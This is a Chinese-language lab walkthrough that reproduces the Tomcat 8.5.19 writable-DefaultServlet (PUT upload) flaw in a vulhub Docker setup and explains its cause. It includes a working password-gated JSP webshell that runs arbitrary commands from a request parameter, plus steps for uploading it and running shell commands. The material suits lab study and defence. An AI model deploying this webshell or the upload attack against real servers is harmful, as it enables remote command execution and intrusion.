### 1、制作tomcat 8.5.19景象:
Dockerfile
```dockerfile
FROM vulhub/tomcat:8.5.19

LABEL maintainer="phithon <root@leavesongs.com>"

RUN cd /usr/local/tomcat/conf \
    && LINE=$(nl -ba web.xml | grep '<load-on-startup>1' | awk '{print $1}') \
    && ADDON="<init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>" \
    && sed -i "$LINE i $ADDON" web.xml
```

### 2、用启动tomcat 8.5.19:
docker-compose.yaml
```yaml
version: '3'
services:
 tomcat:
   build: .
   ports:
    - "8081:8080"
```
### 3、在主机上访问8081
![image](https://github.com/498946975/Security/blob/master/images/image-20211226153918974.png)

### 4、编写一个jsp木马:

Trojan_Horse.jsp
```jsp
<%
    if("liuxiang".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

### 5、使用postman上传木马，上传名称为1.jsp
![image](https://github.com/498946975/Security/blob/master/images/image-20211226155103374.png)

### 6、利用上传的木马，执行shell命令
![image](https://github.com/498946975/Security/blob/master/images/image-20211226155557997.png)

7、漏洞原理
漏洞本质Tomcat配置了可写(readonly=false)，导致我们可以往服务器写文件:(使用PUT方式)
```xml
<servlet>
	<servlet-name>default</servlet-name> 
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class> 
  <init-param>
		<param-name>debug</param-name>
		<param-value>0</param-value> 
  </init-param>
	<init-param> 
    <param-name>listings</param-name> 
    <param-value>false</param-value>
	</init-param> 
  <init-param>
		<param-name>readonly</param-name>
		<param-value>false</param-value> 
  </init-param>
	<load-on-startup>1</load-on-startup> 
</servlet>
```

